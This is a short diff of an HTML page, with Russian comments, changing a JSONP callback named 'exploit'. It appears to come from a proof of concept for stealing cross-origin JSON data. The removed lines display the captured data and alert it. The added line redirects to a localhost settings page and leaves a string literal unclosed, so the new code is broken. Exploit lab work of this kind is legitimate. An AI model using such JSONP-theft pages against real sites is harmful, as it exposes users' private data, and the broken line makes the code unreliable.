@@ -10,12 +10,7 @@
     <script>
         // Функция-обработчик JSONP
         function exploit(data) {
-            document.getElementById('result').innerHTML =
-                '<h2>Success!</h2>' +
-                '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
-
-            // Покажем alert для наглядности
-            alert('Got data: ' + JSON.stringify(data));
+            window.location='http://127.0.0.1:5000/#/settings
         }
     </script>
 
